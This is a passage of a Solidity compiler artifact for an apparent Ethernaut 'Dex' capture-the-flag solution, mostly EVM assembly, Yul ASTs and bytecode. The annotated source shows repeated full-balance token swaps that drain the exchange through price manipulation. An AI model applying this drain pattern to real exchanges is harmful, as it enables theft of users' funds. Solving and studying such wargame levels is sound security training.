and\n      swap4\n        /* \"ethernaut/Dex.sol\":871:885  IDex(dex).swap */\n      0xdf791e50\n      swap4\n        /* \"ethernaut/Dex.sol\":886:892  token1 */\n      dup2\n      and\n      swap3\n        /* \"ethernaut/Dex.sol\":894:900  token2 */\n      and\n      swap1\n        /* \"ethernaut/Dex.sol\":886:892  token1 */\n      dup3\n      swap1\n        /* \"ethernaut/Dex.sol\":902:926  IERC20(token1).balanceOf */\n      0x70a08231\n      swap1\n        /* \"#utility.yul\":1374:1392   */\n      0x24\n      add\n        /* \"ethernaut/Dex.sol\":902:941  IERC20(token1).balanceOf(address(this)) */\n      0x20\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      dup7\n      gas\n      staticcall\n      iszero\n      dup1\n      iszero\n      tag_123\n      jumpi\n      returndatasize\n      0x00\n      dup1\n      returndatacopy\n      revert(0x00, returndatasize)\n    tag_123:\n      pop\n      pop\n      pop\n      pop\n      mload(0x40)\n      returndatasize\n      not(0x1f)\n      0x1f\n      dup3\n      add\n      and\n      dup3\n      add\n      dup1\n      0x40\n      mstore\n      pop\n      dup2\n      add\n      swap1\n      tag_124\n      swap2\n      swap1\n      tag_40\n      jump\t// in\n    tag_124:\n        /* \"ethernaut/Dex.sol\":871:942  IDex(dex).swap(token1, token2, IERC20(token1).balanceOf(address(this))) */\n      mload(0x40)\n      dup5\n      0xffffffff\n      and\n      0xe0\n      shl\n      dup2\n      mstore\n      0x04\n      add\n      tag_125\n      swap4\n      swap3\n      swap2\n      swap1\n      tag_17\n      jump\t// in\n    tag_125:\n      0x00\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      0x00\n      dup8\n      dup1\n      extcodesize\n      iszero\n      dup1\n      iszero\n      tag_126\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_126:\n      pop\n      gas\n      call\n      iszero\n      dup1\n      iszero\n      tag_128\n      jumpi\n      returndatasize\n      0x00\n      dup1\n      returndatacopy\n      revert(0x00, returndatasize)\n    tag_128:\n      pop\n      pop\n        /* \"ethernaut/Dex.sol\":959:962  dex */\n      sload(0x03)\n      0x01\n        /* \"ethernaut/Dex.sol\":969:975  token2 */\n      sload\n        /* \"ethernaut/Dex.sol\":959:962  dex */\n      0x00\n        /* \"ethernaut/Dex.sol\":977:983  token1 */\n      sload\n        /* \"ethernaut/Dex.sol\":985:1024  IERC20(token2).balanceOf(address(this)) */\n      mload(0x40)\n      shl(0xe0, 0x70a08231)\n      dup2\n      mstore\n        /* \"ethernaut/Dex.sol\":1018:1022  this */\n      address\n        /* \"ethernaut/Dex.sol\":985:1024  IERC20(token2).balanceOf(address(this)) */\n      0x04\n      dup3\n      add\n        /* \"#utility.yul\":1401:1452   */\n      mstore\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"ethernaut/Dex.sol\":959:962  dex */\n      swap4\n      dup5\n      and\n      swap6\n      pop\n        /* \"ethernaut/Dex.sol\":954:968  IDex(dex).swap */\n      0xdf791e50\n      swap5\n      pop\n        /* \"ethernaut/Dex.sol\":969:975  token2 */\n      swap2\n      dup4\n      and\n      swap3\n        /* \"ethernaut/Dex.sol\":977:983  token1 */\n      and\n      swap1\n        /* \"ethernaut/Dex.sol\":969:975  token2 */\n      dup3\n      swap1\n        /* \"ethernaut/Dex.sol\":985:1009  IERC20(token2).balanceOf */\n      0x70a08231\n      swap1\n        /* \"#utility.yul\":1374:1392   */\n      0x24\n      add\n        /* \"ethernaut/Dex.sol\":985:1024  IERC20(token2).balanceOf(address(this)) */\n      0x20\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      dup7\n      gas\n      staticcall\n      iszero\n      dup1\n      iszero\n      tag_131\n      jumpi\n      returndatasize\n      0x00\n      dup1\n      returndatacopy\n      revert(0x00, returndatasize)\n    tag_131:\n      pop\n      pop\n      pop\n      pop\n      mload(0x40)\n      returndatasize\n      not(0x1f)\n      0x1f\n      dup3\n      add\n      and\n      dup3\n      add\n      dup1\n      0x40\n      mstore\n      pop\n      dup2\n      add\n      swap1\n      tag_132\n      swap2\n      swap1\n      tag_40\n      jump\t// in\n    tag_132:\n        /* \"ethernaut/Dex.sol\":954:1025  IDex(dex).swap(token2, token1, IERC20(token2).balanceOf(address(this))) */\n      mload(0x40)\n      dup5\n      0xffffffff\n      and\n      0xe0\n      shl\n      dup2\n      mstore\n      0x04\n      add\n      tag_133\n      swap4\n      swap3\n      swap2\n      swap1\n      tag_17\n      jump\t// in\n    tag_133:\n      0x00\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      0x00\n      dup8\n      dup1\n      extcodesize\n      iszero\n      dup1\n      iszero\n      tag_134\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_134:\n      pop\n      gas\n      call\n      iszero\n      dup1\n      iszero\n      tag_136\n      jumpi\n      returndatasize\n      0x00\n      dup1\n      returndatacopy\n      revert(0x00, returndatasize)\n    tag_136:\n      pop\n      pop\n        /* \"ethernaut/Dex.sol\":1040:1043  dex */\n      sload(0x03)\n      0x00\n        /* \"ethernaut/Dex.sol\":1050:1056  token1 */\n      sload\n        /* \"ethernaut/Dex.sol\":1040:1043  dex */\n      0x01\n        /* \"ethernaut/Dex.sol\":1058:1064  token2 */\n      sload\n        /* \"ethernaut/Dex.sol\":1066:1105  IERC20(token1).balanceOf(address(this)) */\n      mload(0x40)\n      shl(0xe0, 0x70a08231)\n      dup2\n      mstore\n        /* \"ethernaut/Dex.sol\":1099:1103  this */\n      address\n        /* \"ethernaut/Dex.sol\":1066:1105  IERC20(token1).balanceOf(address(this)) */\n      0x04\n      dup3\n      add\n        /* \"#utility.yul\":1401:1452   */\n      mstore\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"ethernaut/Dex.sol\":1040:1043  dex */\n      swap4\n      dup5\n      and\n      swap6\n      pop\n        /* \"ethernaut/Dex.sol\":1035:1049  IDex(dex).swap */\n      0xdf791e50\n      swap5\n      pop\n        /* \"ethernaut/Dex.sol\":1050:1056  token1 */\n      swap2\n      dup4\n      and\n      swap3\n        /* \"ethernaut/Dex.sol\":1058:1064  token2 */\n      and\n      swap1\n        /* \"ethernaut/Dex.sol\":1050:1056  token1 */\n      dup3\n      swap1\n        /* \"ethernaut/Dex.sol\":1066:1090  IERC20(token1).balanceOf */\n      0x70a08231\n      swap1\n        /* \"#utility.yul\":1374:1392   */\n      0x24\n      add\n        /* \"ethernaut/Dex.sol\":1066:1105  IERC20(token1).balanceOf(address(this)) */\n      0x20\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      dup7\n      gas\n      staticcall\n      iszero\n      dup1\n      iszero\n      tag_139\n      jumpi\n      returndatasize\n      0x00\n      dup1\n      returndatacopy\n      revert(0x00, returndatasize)\n    tag_139:\n      pop\n      pop\n      pop\n      pop\n      mload(0x40)\n      returndatasize\n      not(0x1f)\n      0x1f\n      dup3\n      add\n      and\n      dup3\n      add\n      dup1\n      0x40\n      mstore\n      pop\n      dup2\n      add\n      swap1\n      tag_140\n      swap2\n      swap1\n      tag_40\n      jump\t// in\n    tag_140:\n        /* \"ethernaut/Dex.sol\":1035:1106  IDex(dex).swap(token1, token2, IERC20(token1).balanceOf(address(this))) */\n      mload(0x40)\n      dup5\n      0xffffffff\n      and\n      0xe0\n      shl\n      dup2\n      mstore\n      0x04\n      add\n      tag_141\n      swap4\n      swap3\n      swap2\n      swap1\n      tag_17\n      jump\t// in\n    tag_141:\n      0x00\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      0x00\n      dup8\n      dup1\n      extcodesize\n      iszero\n      dup1\n      iszero\n      tag_142\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_142:\n      pop\n      gas\n      call\n      iszero\n      dup1\n      iszero\n      tag_144\n      jumpi\n      returndatasize\n      0x00\n      dup1\n      returndatacopy\n      revert(0x00, returndatasize)\n    tag_144:\n      pop\n      pop\n        /* \"ethernaut/Dex.sol\":1121:1124  dex */\n      sload(0x03)\n      0x01\n        /* \"ethernaut/Dex.sol\":1131:1137  token2 */\n      sload\n        /* \"ethernaut/Dex.sol\":1121:1124  dex */\n      0x00\n        /* \"ethernaut/Dex.sol\":1139:1145  token1 */\n      sload\n        /* \"ethernaut/Dex.sol\":1147:1186  IERC20(token2).balanceOf(address(this)) */\n      mload(0x40)\n      shl(0xe0, 0x70a08231)\n      dup2\n      mstore\n        /* \"ethernaut/Dex.sol\":1180:1184  this */\n      address\n        /* \"ethernaut/Dex.sol\":1147:1186  IERC20(token2).balanceOf(address(this)) */\n      0x04\n      dup3\n      add\n        /* \"#utility.yul\":1401:1452   */\n      mstore\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"ethernaut/Dex.sol\":1121:1124  dex */\n      swap4\n      dup5\n      and\n      swap6\n      pop\n        /* \"ethernaut/Dex.sol\":1116:1130  IDex(dex).swap */\n      0xdf791e50\n      swap5\n      pop\n        /* \"ethernaut/Dex.sol\":1131:1137  token2 */\n      swap2\n      dup4\n      and\n      swap3\n        /* \"ethernaut/Dex.sol\":1139:1145  token1 */\n      and\n      swap1\n        /* \"ethernaut/Dex.sol\":1131:1137  token2 */\n      dup3\n      swap1\n        /* \"ethernaut/Dex.sol\":1147:1171  IERC20(token2).balanceOf */\n      0x70a08231\n      swap1\n        /* \"#utility.yul\":1374:1392   */\n      0x24\n      add\n        /* \"ethernaut/Dex.sol\":1147:1186  IERC20(token2).balanceOf(address(this)) */\n      0x20\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      dup7\n      gas\n      staticcall\n      iszero\n      dup1\n      iszero\n      tag_147\n      jumpi\n      returndatasize\n      0x00\n      dup1\n      returndatacopy\n      revert(0x00, returndatasize)\n    tag_147:\n      pop\n      pop\n      pop\n      pop\n      mload(0x40)\n      returndatasize\n      not(0x1f)\n      0x1f\n      dup3\n      add\n      and\n      dup3\n      add\n      dup1\n      0x40\n      mstore\n      pop\n      dup2\n      add\n      swap1\n      tag_148\n      swap2\n      swap1\n      tag_40\n      jump\t// in\n    tag_148:\n        /* \"ethernaut/Dex.sol\":1116:1187  IDex(dex).swap(token2, token1, IERC20(token2).balanceOf(address(this))) */\n      mload(0x40)\n      dup5\n      0xffffffff\n      and\n      0xe0\n      shl\n      dup2\n      mstore\n      0x04\n      add\n      tag_149\n      swap4\n      swap3\n      swap2\n      swap1\n      tag_17\n      jump\t// in\n    tag_149:\n      0x00\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      0x00\n      dup8\n      dup1\n      extcodesize\n      iszero\n      dup1\n      iszero\n      tag_150\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_150:\n      pop\n      gas\n      call\n      iszero\n      dup1\n      iszero\n      tag_152\n      jumpi\n      returndatasize\n      0x00\n      dup1\n      returndatacopy\n      revert(0x00, returndatasize)\n    tag_152:\n      pop\n      pop\n        /* \"ethernaut/Dex.sol\":1202:1205  dex */\n      sload(0x03)\n      0x00\n        /* \"ethernaut/Dex.sol\":1212:1218  token1 */\n      sload\n        /* \"ethernaut/Dex.sol\":1202:1205  dex */\n      0x01\n        /* \"ethernaut/Dex.sol\":1220:1226  token2 */\n      sload\n        /* \"ethernaut/Dex.sol\":1228:1267  IERC20(token1).balanceOf(address(this)) */\n      mload(0x40)\n      shl(0xe0, 0x70a08231)\n      dup2\n      mstore\n        /* \"ethernaut/Dex.sol\":1261:1265  this */\n      address\n        /* \"ethernaut/Dex.sol\":1228:1267  IERC20(token1).balanceOf(address(this)) */\n      0x04\n      dup3\n      add\n        /* \"#utility.yul\":1401:1452   */\n      mstore\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"ethernaut/Dex.sol\":1202:1205  dex */\n      swap4\n      dup5\n      and\n      swap6\n      pop\n        /* \"ethernaut/Dex.sol\":1197:1211  IDex(dex).swap */\n      0xdf791e50\n      swap5\n      pop\n        /* \"ethernaut/Dex.sol\":1212:1218  token1 */\n      swap2\n      dup4\n      and\n      swap3\n        /* \"ethernaut/Dex.sol\":1220:1226  token2 */\n      and\n      swap1\n        /* \"ethernaut/Dex.sol\":1212:1218  token1 */\n      dup3\n      swap1\n        /* \"ethernaut/Dex.sol\":1228:1252  IERC20(token1).balanceOf */\n      0x70a08231\n      swap1\n        /* \"#utility.yul\":1374:1392   */\n      0x24\n      add\n        /* \"ethernaut/Dex.sol\":1228:1267  IERC20(token1).balanceOf(address(this)) */\n      0x20\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      dup7\n      gas\n      staticcall\n      iszero\n      dup1\n      iszero\n      tag_155\n      jumpi\n      returndatasize\n      0x00\n      dup1\n      returndatacopy\n      revert(0x00, returndatasize)\n    tag_155:\n      pop\n      pop\n      pop\n      pop\n      mload(0x40)\n      returndatasize\n      not(0x1f)\n      0x1f\n      dup3\n      add\n      and\n      dup3\n      add\n      dup1\n      0x40\n      mstore\n      pop\n      dup2\n      add\n      swap1\n      tag_156\n      swap2\n      swap1\n      tag_40\n      jump\t// in\n    tag_156:\n        /* \"ethernaut/Dex.sol\":1197:1268  IDex(dex).swap(token1, token2, IERC20(token1).balanceOf(address(this))) */\n      mload(0x40)\n      dup5\n      0xffffffff\n      and\n      0xe0\n      shl\n      dup2\n      mstore\n      0x04\n      add\n      tag_157\n      swap4\n      swap3\n      swap2\n      swap1\n      tag_17\n      jump\t// in\n    tag_157:\n      0x00\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      0x00\n      dup8\n      dup1\n      extcodesize\n      iszero\n      dup1\n      iszero\n      tag_158\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_158:\n      pop\n      gas\n      call\n      iszero\n      dup1\n      iszero\n      tag_160\n      jumpi\n      returndatasize\n      0x00\n      dup1\n      returndatacopy\n      revert(0x00, returndatasize)\n    tag_160:\n      pop\n      pop\n        /* \"ethernaut/Dex.sol\":1283:1286  dex */\n      sload(0x03)\n      0x01\n        /* \"ethernaut/Dex.sol\":1293:1299  token2 */\n      sload\n        /* \"ethernaut/Dex.sol\":1283:1286  dex */\n      0x00\n        /* \"ethernaut/Dex.sol\":1301:1307  token1 */\n      sload\n        /* \"ethernaut/Dex.sol\":1278:1312  IDex(dex).swap(token2, token1, 45) */\n      mload(0x40)\n      shl(0xe4, 0x0df791e5)\n      dup2\n      mstore\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"ethernaut/Dex.sol\":1283:1286  dex */\n      swap4\n      dup5\n      and\n      swap6\n      pop\n        /* \"ethernaut/Dex.sol\":1278:1292  IDex(dex).swap */\n      0xdf791e50\n      swap5\n      pop\n        /* \"ethernaut/Dex.sol\":1278:1312  IDex(dex).swap(token2, token1, 45) */\n      tag_100\n      swap4\n        /* \"ethernaut/Dex.sol\":1293:1299  token2 */\n      swap3\n      dup4\n      and\n      swap3\n        /* \"ethernaut/Dex.sol\":1301:1307  token1 */\n      swap1\n      swap2\n      and\n      swap1\n        /* \"ethernaut/Dex.sol\":1309:1311  45 */\n      0x2d\n      swap1\n        /* \"ethernaut/Dex.sol\":1278:1312  IDex(dex).swap(token2, token1, 45) */\n      0x04\n      add\n      tag_17\n      jump\t// in\n        /* \"#utility.yul\":14:300   */\n    tag_8:\n        /* \"#utility.yul\":73:79   */\n      0x00\n        /* \"#utility.yul\":126:128   */\n      0x20\n        /* \"#utility.yul\":114:123   */\n      dup3\n        /* \"#utility.yul\":105:112   */\n      dup5\n        /* \"#utility.yul\":101:124   */\n      sub\n        /* \"#utility.yul\":97:129   */\n      slt\n        /* \"#utility.yul\":94:146   */\n      iszero\n      tag_167\n      jumpi\n        /* \"#utility.yul\":142:143   */\n      0x00\n        /* \"#utility.yul\":139:140   */\n      dup1\n        /* \"#utility.yul\":132:144   */\n      revert\n        /* \"#utility.yul\":94:146   */\n    tag_167:\n        /* \"#utility.yul\":168:191   */\n      dup2\n      calldataload\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"#utility.yul\":220:251   */\n      dup2\n      and\n        /* \"#utility.yul\":210:252   */\n      dup2\n      eq\n        /* \"#utility.yul\":200:270   */\n      tag_168\n      jumpi\n        /* \"#utility.yul\":266:267   */\n      0x00\n        /* \"#utility.yul\":263:264   */\n      dup1\n        /* \"#utility.yul\":256:268   */\n      revert\n        /* \"#utility.yul\":200:270   */\n    tag_168:\n        /* \"#utility.yul\":289:294   */\n      swap4\n        /* \"#utility.yul\":14:300   */\n      swap3\n      pop\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":305:689   */\n    tag_17:\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"#utility.yul\":572:587   */\n      swap4\n      dup5\n      and\n        /* \"#utility.yul\":554:588   */\n      dup2\n      mstore\n        /* \"#utility.yul\":624:639   */\n      swap2\n      swap1\n      swap3\n      and\n        /* \"#utility.yul\":619:621   */\n      0x20\n        /* \"#utility.yul\":604:622   */\n      dup3\n      add\n        /* \"#utility.yul\":597:640   */\n      mstore\n        /* \"#utility.yul\":671:673   */\n      0x40\n        /* \"#utility.yul\":656:674   */\n      dup2\n      add\n        /* \"#utility.yul\":649:683   */\n      swap2\n      swap1\n      swap2\n      mstore\n        /* \"#utility.yul\":504:506   */\n      0x60\n        /* \"#utility.yul\":489:507   */\n      add\n      swap1\n        /* \"#utility.yul\":305:689   */\n      jump\t// out\n        /* \"#utility.yul\":694:971   */\n    tag_21:\n        /* \"#utility.yul\":761:767   */\n      0x00\n        /* \"#utility.yul\":814:816   */\n      0x20\n        /* \"#utility.yul\":802:811   */\n      dup3\n        /* \"#utility.yul\":793:800   */\n      dup5\n        /* \"#utility.yul\":789:812   */\n      sub\n        /* \"#utility.yul\":785:817   */\n      slt\n        /* \"#utility.yul\":782:834   */\n      iszero\n      tag_171\n      jumpi\n        /* \"#utility.yul\":830:831   */\n      0x00\n        /* \"#utility.yul\":827:828   */\n      dup1\n        /* \"#utility.yul\":820:832   */\n      revert\n        /* \"#utility.yul\":782:834   */\n    tag_171:\n        /* \"#utility.yul\":862:871   */\n      dup2\n        /* \"#utility.yul\":856:872   */\n      mload\n        /* \"#utility.yul\":915:920   */\n      dup1\n        /* \"#utility.yul\":908:921   */\n      iszero\n        /* \"#utility.yul\":901:922   */\n      iszero\n        /* \"#utility.yul\":894:899   */\n      dup2\n        /* \"#utility.yul\":891:923   */\n      eq\n        /* \"#utility.yul\":881:941   */\n      tag_168\n      jumpi\n        /* \"#utility.yul\":937:938   */\n      0x00\n        /* \"#utility.yul\":934:935   */\n      dup1\n        /* \"#utility.yul\":927:939   */\n      revert\n        /* \"#utility.yul\":1463:1647   */\n    tag_40:\n        /* \"#utility.yul\":1533:1539   */\n      0x00\n        /* \"#utility.yul\":1586:1588   */\n      0x20\n        /* \"#utility.yul\":1574:1583   */\n      dup3\n        /* \"#utility.yul\":1565:1572   */\n      dup5\n        /* \"#utility.yul\":1561:1584   */\n      sub\n        /* \"#utility.yul\":1557:1589   */\n      slt\n        /* \"#utility.yul\":1554:1606   */\n      iszero\n      tag_176\n      jumpi\n        /* \"#utility.yul\":1602:1603   */\n      0x00\n        /* \"#utility.yul\":1599:1600   */\n      dup1\n        /* \"#utility.yul\":1592:1604   */\n      revert\n        /* \"#utility.yul\":1554:1606   */\n    tag_176:\n      pop\n        /* \"#utility.yul\":1625:1641   */\n      mload\n      swap2\n        /* \"#utility.yul\":1463:1647   */\n      swap1\n      pop\n      jump\t// out\n\n    auxdata: 0xa2646970667358221220c015545002b616c960000340f211e4b96c1eed86be79a67aef673e97ba5f4b7064736f6c63430008120033\n}\n",
						"bytecode": {
							"functionDebugData": {
								"@_755": {
									"entryPoint": null,
									"id": 755,
									"parameterSlots": 3,
									"returnSlots": 0
								},
								"abi_decode_address_fromMemory": {
									"entryPoint": 113,
									"id": null,
									"parameterSlots": 1,
									"returnSlots": 1
								},
								"abi_decode_tuple_t_addresst_addresst_address_fromMemory": {
									"entryPoint": 141,
									"id": null,
									"parameterSlots": 2,
									"returnSlots": 3
								}
							},
							"generatedSources": [
								{
									"ast": {
										"nodeType": "YulBlock",
										"src": "0:576:5",
										"statements": [
											{
												"nodeType": "YulBlock",
												"src": "6:3:5",
												"statements": []
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "74:117:5",
													"statements": [
														{
															"nodeType": "YulAssignment",
															"src": "84:22:5",
															"value": {
																"arguments": [
																	{
																		"name": "offset",
																		"nodeType": "YulIdentifier",
																		"src": "99:6:5"
																	}
																],
																"functionName": {
																	"name": "mload",
																	"nodeType": "YulIdentifier",
																	"src": "93:5:5"
																},
																"nodeType": "YulFunctionCall",
																"src": "93:13:5"
															},
															"variableNames": [
																{
																	"name": "value",
																	"nodeType": "YulIdentifier",
																	"src": "84:5:5"
																}
															]
														},
														{
															"body": {
																"nodeType": "YulBlock",
																"src": "169:16:5",
																"statements": [
																	{
																		"expression": {
																			"arguments": [
																				{
																					"kind": "number",
																					"nodeType": "YulLiteral",
																					"src": "178:1:5",
																					"type": "",
																					"value": "0"
																				},
																				{
																					"kind": "number",
																					"nodeType": "YulLiteral",
																					"src": "181:1:5",
																					"type": "",
																					"value": "0"
																				}
																			],
																			"functionName": {
																				"name": "revert",
																				"nodeType": "YulIdentifier",
																				"src": "171:6:5"
																			},
																			"nodeType": "YulFunctionCall",
																			"src": "171:12:5"
																		},
																		"nodeType": "YulExpressionStatement",
																		"src": "171:12:5"
																	}
																]
															},
															"condition": {
																"arguments": [
																	{
																		"arguments": [
																			{
																				"name": "value",
																				"nodeType": "YulIdentifier",
																				"src": "128:5:5"
																			},
																			{
																				"arguments": [
																					{
																						"name": "value",
																						"nodeType": "YulIdentifier",
																						"src": "139:5:5"
																					},
																					{
																						"arguments": [
																							{
																								"arguments": [
																									{
																										"kind": "number",
																										"nodeType": "YulLiteral",
																										"src": "154:3:5",
																										"type": "",
																										"value": "160"
																									},
																									{
																										"kind": "number",
																										"nodeType": "YulLiteral",
																										"src": "159:1:5",
																										"type": "",
																										"value": "1"
																									}
																								],
																								"functionName": {
																									"name": "shl",
																									"nodeType": "YulIdentifier",
																									"src": "150:3:5"
																								},
																								"nodeType": "YulFunctionCall",
																								"src": "150:11:5"
																							},
																							{
																								"kind": "number",
																								"nodeType": "YulLiteral",
																								"src": "163:1:5",
																								"type": "",
																								"value": "1"
																							}
																						],
																						"functionName": {
																							"name": "sub",
																							"nodeType": "YulIdentifier",
																							"src": "146:3:5"
																						},
																						"nodeType": "YulFunctionCall",
																						"src": "146:19:5"
																					}
																				],
																				"functionName": {
																					"name": "and",
																					"nodeType": "YulIdentifier",
																					"src": "135:3:5"
																				},
																				"nodeType": "YulFunctionCall",
																				"src": "135:31:5"
																			}
																		],
																		"functionName": {
																			"name": "eq",
																			"nodeType": "YulIdentifier",
																			"src": "125:2:5"
																		},
																		"nodeType": "YulFunctionCall",
																		"src": "125:42:5"
																	}
																],
																"functionName": {
																	"name": "iszero",
																	"nodeType": "YulIdentifier",
																	"src": "118:6:5"
																},
																"nodeType": "YulFunctionCall",
																"src": "118:50:5"
															},
															"nodeType": "YulIf",
															"src": "115:70:5"
														}
													]
												},
												"name": "abi_decode_address_fromMemory",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "offset",
														"nodeType": "YulTypedName",
														"src": "53:6:5",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "value",
														"nodeType": "YulTypedName",
														"src": "64:5:5",
														"type": ""
													}
												],
												"src": "14:177:5"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "311:263:5",
													"statements": [
														{
															"body": {
																"nodeType": "YulBlock",
																"src": "357:16:5",
																"statements": [
																	{
																		"expression": {
																			"arguments": [
																				{
																					"kind": "number",
																					"nodeType": "YulLiteral",
																					"src": "366:1:5",
																					"type": "",
																					"value": "0"
																				},
																				{
																					"kind": "number",
																					"nodeType": "YulLiteral",
																					"src": "369:1:5",
																					"type": "",
																					"value": "0"
																				}
																			],
																			"functionName": {
																				"name": "revert",
																				"nodeType": "YulIdentifier",
																				"src": "359:6:5"
																			},
																			"nodeType": "YulFunctionCall",
																			"src": "359:12:5"
																		},
																		"nodeType": "YulExpressionStatement",
																		"src": "359:12:5"
																	}
																]
															},
															"condition": {
																"arguments": [
																	{
																		"arguments": [
																			{
																				"name": "dataEnd",
																				"nodeType": "YulIdentifier",
																				"src": "332:7:5"
																			},
																			{
																				"name": "headStart",
																				"nodeType": "YulIdentifier",
																				"src": "341:9:5"
																			}
																		],
																		"functionName": {
																			"name": "sub",
																			"nodeType": "YulIdentifier",
																			"src": "328:3:5"
																		},
																		"nodeType": "YulFunctionCall",
																		"src": "328:23:5"
																	},
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "353:2:5",
																		"type": "",
																		"value": "96"
																	}
																],
																"functionName": {
																	"name": "slt",
																	"nodeType": "YulIdentifier",
																	"src": "324:3:5"
																},
																"nodeType": "YulFunctionCall",
																"src": "324:32:5"
															},
															"nodeType": "YulIf",
															"src": "321:52:5"
														},
														{
															"nodeType": "YulAssignment",
															"src": "382:50:5",
															"value": {
																"arguments": [
																	{
																		"name": "headStart",
																		"nodeType": "YulIdentifier",
																		"src": "422:9:5"
																	}
																],
																"functionName": {
																	"name": "abi_decode_address_fromMemory",
																	"nodeType": "YulIdentifier",
																	"src": "392:29:5"
																},
																"nodeType": "YulFunctionCall",
																"src": "392:40:5"
															},
															"variableNames": [
																{
																	"name": "value0",
																	"nodeType": "YulIdentifier",
																	"src": "382:6:5"
																}
															]
														},
														{
															"nodeType": "YulAssignment",
															"src": "441:59:5",
															"value": {
																"arguments": [
																	{
																		"arguments": [
																			{
																				"name": "headStart",
																				"nodeType": "YulIdentifier",
																				"src": "485:9:5"
																			},
																			{
																				"kind": "number",
																				"nodeType": "YulLiteral",
																				"src": "496:2:5",
																				"type": "",
																				"value": "32"
																			}
																		],
																		"functionName": {
																			"name": "add",
																			"nodeType": "YulIdentifier",
																			"src": "481:3:5"
																		},
																		"nodeType": "YulFunctionCall",
																		"src": "481:18:5"
																	}
																],
																"functionName": {
																	"name": "abi_decode_address_fromMemory",
																	"nodeType": "YulIdentifier",
																	"src": "451:29:5"
																},
																"nodeType": "YulFunctionCall",
																"src": "451:49:5"
															},
															"variableNames": [
																{
																	"name": "value1",
																	"nodeType": "YulIdentifier",
																	"src": "441:6:5"
																}
															]
														},
														{
															"nodeType": "YulAssignment",
															"src": "509:59:5",
															"value": {
																"arguments": [
																	{
																		"arguments": [
																			{
																				"name": "headStart",
																				"nodeType": "YulIdentifier",
																				"src": "553:9:5"
																			},
																			{
																				"kind": "number",
																				"nodeType": "YulLiteral",
																				"src": "564:2:5",
																				"type": "",
																				"value": "64"
																			}
																		],
																		"functionName": {
																			"name": "add",
																			"nodeType": "YulIdentifier",
																			"src": "549:3:5"
																		},
																		"nodeType": "YulFunctionCall",
																		"src": "549:18:5"
																	}
																],
																"functionName": {
																	"name": "abi_decode_address_fromMemory",
																	"nodeType": "YulIdentifier",
																	"src": "519:29:5"
																},
																"nodeType": "YulFunctionCall",
																"src": "519:49:5"
															},
															"variableNames": [
																{
																	"name": "value2",
																	"nodeType": "YulIdentifier",
																	"src": "509:6:5"
																}
															]
														}
													]
												},
												"name": "abi_decode_tuple_t_addresst_addresst_address_fromMemory",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "headStart",
														"nodeType": "YulTypedName",
														"src": "261:9:5",
														"type": ""
													},
													{
														"name": "dataEnd",
														"nodeType": "YulTypedName",
														"src": "272:7:5",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "value0",
														"nodeType": "YulTypedName",
														"src": "284:6:5",
														"type": ""
													},
													{
														"name": "value1",
														"nodeType": "YulTypedName",
														"src": "292:6:5",
														"type": ""
													},
													{
														"name": "value2",
														"nodeType": "YulTypedName",
														"src": "300:6:5",
														"type": ""
													}
												],
												"src": "196:378:5"
											}
										]
									},
									"contents": "{\n    { }\n    function abi_decode_address_fromMemory(offset) -> value\n    {\n        value := mload(offset)\n        if iszero(eq(value, and(value, sub(shl(160, 1), 1)))) { revert(0, 0) }\n    }\n    function abi_decode_tuple_t_addresst_addresst_address_fromMemory(headStart, dataEnd) -> value0, value1, value2\n    {\n        if slt(sub(dataEnd, headStart), 96) { revert(0, 0) }\n        value0 := abi_decode_address_fromMemory(headStart)\n        value1 := abi_decode_address_fromMemory(add(headStart, 32))\n        value2 := abi_decode_address_fromMemory(add(headStart, 64))\n    }\n}",
									"id": 5,
									"language": "Yul",
									"name": "#utility.yul"
								}
							],
							"linkReferences": {},
							"object": "608060405234801561001057600080fd5b5060405161110b38038061110b83398101604081905261002f9161008d565b600080546001600160a01b039485166001600160a01b0319918216179091556001805493851693821693909317909255600380549190931691161790556100d0565b80516001600160a01b038116811461008857600080fd5b919050565b6000806000606084860312156100a257600080fd5b6100ab84610071565b92506100b960208501610071565b91506100c760408501610071565b90509250925092565b61102c806100df6000396000f3fe608060405234801561001057600080fd5b50600436106100415760003560e01c80632216e590146100465780633e50269c14610078578063d7df8d6f14610080575b600080fd5b610076610054366004610f67565b600280546001600160a01b0319166001600160a01b0392909216919091179055565b005b610076610088565b610076610931565b6000546040516323b872dd60e01b81526001600160a01b03909116906323b872dd906100bd9033903090600a90600401610f97565b6020604051808303816000875af11580156100dc573d6000803e3d6000fd5b505050506040513d601f19601f820116820180604052508101906101009190610fbb565b506001546040516323b872dd60e01b81526001600160a01b03909116906323b872dd906101369033903090600a90600401610f97565b6020604051808303816000875af1158015610155573d6000803e3d6000fd5b505050506040513d601f19601f820116820180604052508101906101799190610fbb565b5060005460035460405163095ea7b360e01b81526001600160a01b039182166004820152600019602482015291169063095ea7b3906044016020604051808303816000875af11580156101d0573d6000803e3d6000fd5b505050506040513d601f19601f8201